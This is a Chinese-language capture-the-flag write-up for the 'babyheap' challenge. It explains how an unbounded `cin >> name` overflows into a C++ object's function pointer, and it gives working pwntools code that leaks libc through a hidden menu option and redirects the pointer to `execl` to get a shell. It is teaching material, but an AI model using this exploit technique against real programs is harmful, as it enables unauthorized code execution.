# babyheap

## 题目简述

程序在 `std::vector<Greycat>` 中创建灰猫，并提供按索引调用 `Greycat::talk()` 的菜单。隐藏菜单值 `6767` 会打印 `malloc` 的真实地址。`Greycat` 构造函数却把不受长度限制的 `std::cin >> name` 写入一个固定的 `char name[32]`：

```cpp
class Greycat {
public:
    int legs = 4;
    char name[32];
    void (*speak)(char[]) = meow;

    Greycat() {
        cin >> name;
    }
    void talk() { speak(name); }
};
```

在 x86-64 的对象布局中，`name` 从偏移 $4$ 开始，后面有 $4$ 字节对齐填充，函数指针位于相对 `name` 的偏移 $36$。因此一次名字输入可以覆盖 `speak`，而 `talk()` 会通过该被覆盖指针把 `name` 作为第一个参数调用。决定性障碍是堆上 C++ 对象内的函数指针覆盖与 ASLR 绕过，故归入 `pwn`。

## 解题过程

### 获得 libc 基址

先触发未在菜单显示的分支：`choice == 6767`。它输出的是动态链接 libc 中 `malloc` 的地址，而不是 PLT 桩地址。使用服务容器匹配的 libc 符号偏移即可计算：

$$
\mathrm{libc\_base}=\mathrm{leaked\_malloc}-\mathrm{offset}(\texttt{malloc}).
$$

这一步足以消除 ASLR；不需要泄露或伪造 `std::vector` 的内部指针。`reserve(10)` 只让 vector 的对象存储稳定，也没有修复构造函数向对象字段外写入的问题。

### 覆盖对象内的 `speak` 指针

从 `name` 起填满 $32$ 字节数组和其后 $4$ 字节 padding，再写入目标函数地址。将字符串 `/bin/sh\0` 放在 `name` 开头，函数指针改为与目标 libc 匹配的 `execl`；官方 solver 选择该入口，是因为目标地址的字节表示可以穿过 `operator>>` 的空白字符限制，而 `execve` 需要额外的有效 `argv`/`envp` 参数。

```python
# malloc_offset 和 execl_offset 取自部署所用的 libc。
io.sendlineafter(PROMPT, b"6767")
malloc_addr = int(io.recvline().strip(), 16)
libc_base = malloc_addr - malloc_offset
execl_addr = libc_base + execl_offset

io.sendlineafter(PROMPT, b"2")
payload = b"/bin/sh\x00".ljust(36, b"\x00") + p64(execl_addr)
io.sendlineafter(b"Enter greycat name:\n", payload)
```

`/bin/sh\x00` 后的零填充不影响把 `name` 解释为路径。需要注意的是，NUL 不是 formatted input 的空白分隔符；真正会截断该次 `cin >> name` 的是空格、换行、tab 等空白字节。因此应根据泄露出来的 libc 基址检查最终函数指针的八个字节，并选择可无空白字节传输的可用入口。

这里不能把 `execl` 误写成“只需控制一个参数”的通用目标。对索引 $0$，`main` 将索引放入 `RSI` 后调用 `vector::operator[]`；该函数只读取/保存 `RSI` 而不改写它。`talk()` 取出 `speak` 后将 `RDX` 和 `RDI` 都设为 `&name`，但不修改 `RSI`。所以间接调用到达 `execl` 时寄存器状态为 `RDI = &"/bin/sh"`、`RSI = 0`、`RDX = &name`，即等价于从其固定参数开始调用 `execl("/bin/sh", NULL, ...)`。后续可变参数并不作为这条链的通用前提；它依赖本题的调用现场使第二参数为 NULL，并依赖目标 Linux/glibc 对该空参数列表的执行行为。

### 触发间接调用

灰猫索引 $0$ 是刚创建的对象。选择菜单项 `3` 并输入该索引会执行覆盖后的 `speak(name)`：

```python
io.sendlineafter(PROMPT, b"3")
io.sendlineafter(b"Greycat index:", b"0")
io.interactive()
```

此时函数指针会在上述寄存器状态下进入 `execl`。官方 solver 在题目给定的 Ubuntu 22.04 构建/调用现场据此获得 shell 并读取 flag `grey{b4by_st3p5_1n_babY_h34P!}`；将该结论移植到其他 libc、编译器优化级别或不同灰猫索引时，都必须重新核对参数寄存器，而不能假定 `execl` 天然适用于单参数函数指针调用。该攻击不需要释放对象，题目名称中“从不 free”并不能防止同一对象构造阶段发生越界写。

## 方法总结

- 核心技巧：以未界定的 C++ 字符数组输入覆盖同一 heap object 的函数指针，借由正常业务方法触发间接调用。
- 识别信号：对象中 `char[N]` 紧邻函数指针、输入使用 `cin >> buffer` 或等价无边界 API、程序又存在可调用该函数指针的方法时，应优先计算对象字段偏移，而不是只寻找 UAF。
- 复用要点：数据指针劫持不依赖覆盖返回地址，栈 canary 与 NX 都不是主要障碍；若 ASLR 开启，先找公开地址泄露。格式化输入还会限制 payload 中的空白字节，libc 目标选择必须同时满足调用参数、调用现场寄存器和字节可传输性。
